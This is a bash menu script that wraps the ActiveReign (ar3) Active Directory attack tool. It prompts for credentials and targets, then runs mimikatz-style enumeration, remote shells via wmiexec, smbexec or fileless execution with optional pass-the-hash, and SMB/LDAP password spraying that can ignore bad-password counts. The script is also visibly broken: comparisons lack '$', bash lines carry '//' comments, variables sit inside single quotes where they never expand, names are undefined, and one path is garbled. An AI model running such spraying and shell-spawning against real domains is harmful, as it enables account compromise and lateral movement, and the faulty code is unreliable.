#!/bin/bash
ORNG='\033[0;33m'
NC='\033[0m'
W='\033[1;37m'
LP='\033[1;35m'
YLW='\033[1;33m'
LBBLUE='\e[104m'
A='SMB'
B='LDAP'

## Script Variables
# Config options
config(){
  cat /opt/ActiveReign/ar3/config.json
  echo -e "${W}Would you like to edit?(y/n)${NC}"
  read CONANS
  if [[ ${CONANS} == "y" ]]; then
    sudo cp /opt/ActiveReign/ar3/config.json /opt/ActiveReign/ar3/default_config.json
    sudo nano /opt/ActiveReign/ar3/config.json
  else 
    echo ""
  fi
}
cedit(){
  sudo nano /opt/ActiveReign/ar3/config.json
}
# Database options
work_with_database(){
  ar3 db help
  echo -e "${W}Would you like to insert data into the databse or query tables?(i/q)${NC}"
  read WWD
  sleep 1
  if [[ WWD == "i" ]]; then
    idb
  else
    qdb
  fi
}
retry_insert(){
  idb
}
# Insert into DB
idb(){
  echo -e "${W}Please enter the table to insert to: ${NC}"
  echo -e "${RED}NOTE: ${W}Currently only domains and user creds are supported${NC}"
  read DBTABLE
  sleep 1
  if [[ DBTABLE == "domains" ]]; then                               //domains
    echo -e "${W}Please enter the data to insert: ${NC}"
    read DATA
    sleep 1
    ar3 db insert -d ${DATA}
  elif [[ DBTABLE == "users" ]]; then                               //users
    echo -e "${W}Please enter the username to insert: ${NC}"
    read UDATA
    echo -e "${W}Please enter the password to insert: ${NC}"
    read PDATA
    sleep 1
    ar3 db insert -u ${UDATA} -p ${PDATA}
#  elif [[ DBTABLE == "creds" ]]; then                               //creds
#    echo -e "${W}Please enter the hash to insert: ${NC}"
#    read HDATA
#    ar3 db insert
#  elif [[ DBTABLE == "" ]]; then                                  //groups
#  elif [[ condition ]]; then                                        //computers
  else
    echo -e "${RED}You have not entered a valid table${NC}"
    retry_insert
  fi
}
# Query DB
qdb(){
  ar3 db help
  echo -e "${W}Please enter the table to query: ${NC}"
  read TABLE
  sleep 1
  ar3 db ${TABLE}
}

# Attack Options
# Enumeration Options
enum_opt(){
  ar3 enum -h
  echo -e "${ORNG}Please enter your options along with values"
  echo -e "${W}eg. -u admin -p password -M mimikatz target"
  read ENUMARGS
  sleep 1
  ar3 enum $ENUMARGS
}
# Shell Options
spawn_shell(){
  echo -e "${ORNG}Please enter the username to use: "
  read USER
  echo -e "${ORNG}Please enter the password to use: "
  read PASS
  echo -e "${ORNG}Would you like to use a hash?(y/n)${NC}"
  read QHASH
  if [[ ${QHASH} == "y" ]]; then
    echo -e "${ORNG}Please enter the hash to use: ${NC}"
    read UHASH
    sleep 1
  else
    echo ""
  fi
  echo -e "${ORNG}Please enter your timeout value: ${NC}"
  read TIMEOUT
  echo -e "${ORNG}Please enter your target: ${NC}"
  read TARGET
  sleep 1
  if [[ ${QHASH} == "y" ]]; then
    EXHASH='-H ${UHASH}'
  else
    EXHASH=''
  fi
  ar3 shell -u ${USER} -p ${PASS} ${EXHASH} -t ${TIMEOUT} --local-auth --exec-method wmiexec ${TARGET}
  ar3 shell -u ${USER} -p ${PASS} ${EXHASH} -t ${TIMEOUT} --local-auth --exec-method smbexec ${TARGET}
  ar3 shell -u ${USER} -p ${PASS} ${EXHASH} -t ${TIMEOUT} --local-auth --fileless ${TARGET}
}
# Spray Options
spray(){
  echo -e "${W}What spray method would you like to use?"
  echo -e "${LP}A = SMB"
  echo -e "B = LDAP${NC}"
  read METHOD
  echo -e "${W}Please enter your target${NC}"
  read TARGET
  echo -e "${W}Would you like to spray a single account name or a user list?(s/l)"
  read S_ACC
  if [[ ${S_ACC} == "s" ]]; then
    echo -e "${W}Please enter the account name to spray?${NC}"
    read SACC
    FACC='-u ${SACC}'
  else
    echo -e "${W}Please enter the full path/to/userlist${NC}"
    read SACC
    FACC='-U ${SACC}'
  fi
  echo -e "${W}Would you like to use a single password or a password list?(s/l)"
  read S_PASS
  if [[ ${S_PASS} == "s" ]]; then
    echo -e "${W}Please enter the password to use?${NC}"
    read SPASS
    FPASS='-p ${SPASS}'
  else
    echo -e "${W}Please enter the full path/to/passlist${NC}"
    read SPASS
    FPASS='-P ${SPASS}'
  fi
  echo -e "${W}Would you like to authenticate against a domain or a local IP?(d/l)${NC}"
  read AUTH_Q
  if [[ ${AUTH_Q} == "d" ]]; then
    echo -e "${W}Please enter the domain${NC}"
    read DOMAIN
    FTARGET='-d ${DOMAIN}'
  else
    FTARGET='--local-auth'
  fi
  if [[ ${MODULE} == "2" ]]; then
    echo -e "${W}Would you like to spray all users regardless of BadPwd count?(y/n)${NC}"
    read BP_COUNT_Q
    if [[ ${BP_COUNT_Q} == "y" ]]; then
      BP_OPT='--force-all'
    else
      BP_OPT=''
    fi
  else
    echo ""
  fi
  echo -e "${W}Would you like to set a lockout threshold, if domain aquisition fails?(y/n)${NC}"
  read LTHRESHQ
  if [[ ${LTHRESHQ} == "y" ]]; then
    echo -e "${W}Please enter lockout threshold?(Default is 3)${NC}"
    read LTHRESH
  else
    LTHRESH='3'
  fi
  sleep 2
  ar3 spray -m ${METHOD} ${FACC} ${FPASS} ${FTARGET} ${BP_OPT} --threshold ${LTHRESH} ${TARGET}
}
# Query Options
query_mode(){
  echo -e "${W}Please enter the LDAP Server to Query${NC}"
  read LSERV_OPT
  echo -e "${W}Would you like to query domain users?(y/n)${NC}"
  read QUSERS
  if [[ ${QUSERS} == "y" ]]; then
    FUSERS='--users'
  else
    FUSERS=''
  fi
  echo -e "${W}Would you like to query domain groups?(y/n)${NC}"
  read QGROUPS
  if [[ ${QGROUPS} == "y" ]]; then
    FGROUPS='--groups'
  else
    FGROUPS=''
  fi
  echo -e "${W}Would you like to query domain computers?(y/n)${NC}"
  read QCOMP
  if [[ ${QCOMP} == "y" ]]; then
    FCOMP='--computers'
  else
    FCOMP=''
  fi
  echo -e "${W}Would you like to query domain information?(y/n)${NC}"
  read QINFO
  if [[ ${QINFO} == "y" ]]; then
    FINFO='--domain'
  else
    FINFO=''
  fi
  ar3 query ${LSERV_OPT} ${FUSERS} ${FGROUPS} ${FCOMP} ${FINFO}
}

# Start of Script Execution
echo -e "${LP}"
figlet -f mini "ActiveReign"
echo -e {NC}
PS3='What would you like to do?'
        options=("Work With Database" "System Enum & Module Exec" "Spawn Emulated Shell on System" "Domain Pass Spraying or Bruting" "LDAP Queires on Domain" "Check Default Config" "Edit Default Config" "Back" "Quit")
        select opt in "${options[@]}"
        do
                case $opt in
                    "Work With Database")
                        work_with_database
                        ./modules/exmods/ar3.sh
                        ;;

                    "System Enum & Module Exec")
                        enum_opt
                        ./modules/exmods/ar3.sh
                        ;;

                    "Spawn Emulated Shell on System")
                        spawn_shell
                        ./modules/exmods/ar3.sh
                        ;;

                    "Domain Pass Spraying or Bruting")
                        spray
                        ./modules/exmods/ar3.#!/bin/sh
                        ;;

                    "LDAP Queires on Domain")
                        query_mode
                        ./modules/exmods/ar3.sh
                        ;;

                    "Check Default Config")
                        config
                        ./modules/exmods/ar3.sh
                        ;;

                    "Edit Default Config")
                        cedit
                        ./modules/exmods/ar3.sh
                        ;;

                    "Back")
                        ./modules/module.sh
                        ;;

                    "Quit")
                        exit
                        ;;
                esac
        done
